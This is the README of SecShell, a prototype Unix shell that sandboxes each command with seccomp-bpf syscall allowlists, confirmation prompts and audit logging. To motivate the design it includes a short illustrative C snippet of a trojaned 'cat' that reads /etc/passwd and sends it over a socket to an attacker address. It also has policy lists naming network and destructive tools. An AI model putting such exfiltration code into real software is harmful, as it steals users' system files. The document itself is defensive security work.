# SecShell — A Security-Enhanced Unix Shell

A Unix shell that enforces the **principle of least privilege** at the kernel level,
using Linux `seccomp-bpf` to sandbox every command it executes.

---

## The Problem

Every shell you have ever used — bash, zsh, fish — runs commands with your full user privileges.

When you type `cat file.txt`, the `cat` process can:

- Open network sockets
- Spawn new processes
- Overwrite any file you own
- Call `setuid` to attempt privilege escalation

It just doesn't. But it _could_. And if that binary is ever compromised — supply-chain attack, path hijack, malicious package — it _will_.

This is a direct violation of the **principle of least privilege**: every process should operate with the minimum rights it needs to do its job, and nothing more.

**SecShell enforces this.**

---

## How It Works

SecShell classifies every command into a security policy before executing it. Using the Linux kernel's `seccomp-bpf` mechanism, it installs a syscall allowlist in the child process _after_ `fork()` but _before_ `execvp()`. The kernel enforces this filter at the syscall boundary — there is no userspace bypass.

```
User types: cat /etc/passwd
                │
                ▼
        Policy lookup → READONLY
                │
              fork()
             /       \
        Parent         Child
        waits          │
                       ├─ prctl(PR_SET_NO_NEW_PRIVS)
                       ├─ prctl(PR_SET_SECCOMP, filter)
                       └─ execvp("cat", args)
                                │
                    ┌───────────┴────────────┐
                    │  Kernel BPF filter     │
                    │  runs on every syscall │
                    └───────────┬────────────┘
                         open() → ALLOW
                         read() → ALLOW
                        write() → ALLOW
                       socket() → KILL (SIGSYS)
```

---

## Security Policies

| Policy         | Commands                                    | Mechanism                                                                              |
| -------------- | ------------------------------------------- | -------------------------------------------------------------------------------------- |
| `READONLY`     | cat, ls, grep, find, head, tail, less, more | Allowlist: read, open, openat, close, fstat, write, mmap, brk, exit. All else → SIGSYS |
| `WRITEONLY`    | cp, mv, echo, touch, mkdir                  | Allowlist: file I/O + stat syscalls. Network syscalls absent → SIGSYS                  |
| `NETWORK`      | curl, wget, ping, ssh                       | Denylist: execve, fork, clone blocked. All other syscalls allowed                      |
| `DANGEROUS`    | rm, chmod, chown, dd, mkfs                  | Requires explicit `yes` confirmation before execution                                  |
| `UNRESTRICTED` | All other commands                          | No filter applied. Execution logged                                                    |

---

## A Concrete Attack

Suppose a supply-chain attack replaces `/usr/bin/cat` with this:

```c
int fd = open("/etc/passwd", O_RDONLY);
read(fd, buf, sizeof buf);

/* exfiltrate */
int sock = socket(AF_INET, SOCK_STREAM, 0);
connect(sock, &attacker, sizeof attacker);
write(sock, buf, strlen(buf));
```

**Without SecShell:** the attack runs silently and succeeds.

**With SecShell:**

```
[SecShell] policy=READONLY  cmd=cat
[SecShell] blocked: forbidden syscall attempted by 'cat'
```

`socket()` is not in the READONLY allowlist. The kernel delivers `SIGSYS` and kills the process before the connection is made.

---

## Implementation Notes

### seccomp-bpf

`seccomp` (Secure Computing Mode) is a Linux kernel feature for syscall filtering. The BPF variant allows a program to install a filter — a small bytecode program — that the kernel runs on every syscall before dispatching it.

```c
struct sock_filter filter[] = {
    /* load syscall number */
    BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(struct seccomp_data, nr)),

    /* allow read */
    BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_read, 0, 1),
    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),

    /* ... */

    /* kill everything else */
    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL)
};
```

The filter runs in kernel space. A process cannot remove or bypass its own seccomp filter.

### PR_SET_NO_NEW_PRIVS

Before installing any filter, SecShell calls:

```c
prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);
```

This prevents the child process from gaining elevated privileges through `setuid` or `setgid` binaries, closing a common privilege escalation path. It is also a prerequisite for unprivileged seccomp filter installation.

### Why fork() before filtering?

The shell process itself requires unrestricted syscall access to read input, manage jobs, and fork children. The filter is applied only in the child, after `fork()` and before `execvp()`. The parent is never restricted.

### Known Limitation: write() fd filtering

The READONLY policy allows `write()` so programs can produce output. Classic BPF cannot inspect syscall arguments (only the syscall number), so this allows `write()` to any file descriptor, not just stdout/stderr. Restricting by fd argument requires stateful eBPF, which is a known direction for future work.

---

## Build & Run

**Requirements:** Linux kernel ≥ 3.5 (seccomp-bpf), GCC

```bash
git clone https://github.com/Celestialglitch/SecShell
cd SecShell
make
./secshell
```

```
SecShell — security-enhanced shell  (type 'help' for policies)

secshell> cat /etc/hostname
[SecShell] policy=READONLY  cmd=cat
mymachine

secshell> rm notes.txt
[SecShell] WARNING: 'rm' is a destructive command.
           Type 'yes' to proceed: no
[SecShell] Aborted.

secshell> stats
Last command overhead: 312048 ns (0.312 ms)

secshell> help
Policies:
  READONLY    : cat ls grep head tail less more find
  WRITEONLY   : echo cp mv touch mkdir
  NETWORK     : curl wget ping ssh
  DANGEROUS   : rm chmod chown dd mkfs  (confirmation required)
  UNRESTRICTED: all other commands (logged, not filtered)
Audit log   : secshell_audit.log

secshell> exit
SecShell exited.  Audit log: secshell_audit.log
```

---

## Audit Log

```
[Mon Mar 23 12:01:44 2026] CMD=cat   POLICY=1 ALLOWED=1 REASON=exited
[Mon Mar 23 12:01:51 2026] CMD=rm    POLICY=4 ALLOWED=0 REASON=user denied
[Mon Mar 23 12:02:03 2026] CMD=curl  POLICY=3 ALLOWED=1 REASON=network access permitted
[Mon Mar 23 12:02:19 2026] CMD=cat   POLICY=1 ALLOWED=0 REASON=seccomp violation
```

---

## Limitations

This is a prototype. Known constraints:

- **Static policy database.** Policies are hardcoded. A future direction is automatic policy generation via dynamic tracing (strace).
- **write() fd restriction not enforced.** Classic BPF cannot filter by syscall argument. READONLY allows write() to any fd.
- **No pipe sandboxing.** Commands in a pipeline (`ls | grep`) are not individually filtered.
- **Linux only.** seccomp-bpf is a Linux kernel interface.
- **No job control.** `jobs`, `fg`, `bg` are not implemented.

---

## Related Work

| Tool               | Approach                   | Granularity                       |
| ------------------ | -------------------------- | --------------------------------- |
| SecShell           | seccomp-bpf per command    | Per interactive command           |
| Firejail           | Linux namespaces + seccomp | Per application launch            |
| Docker             | Full container isolation   | Per container                     |
| Capsicum (FreeBSD) | Capability mode            | Per process (kernel modification) |
| OpenBSD pledge     | pledge/unveil              | Per process (application opt-in)  |

SecShell differs in applying kernel-enforced filtering interactively at the shell level, with no application modification required.

---

## Author

Ongkar Dasgupta  
Department Of Computer Science and Engineering, NIT Agartala

[GitHub](https://github.com/Celestialglitch) · 

---

## License

MIT — see [LICENSE](LICENSE)
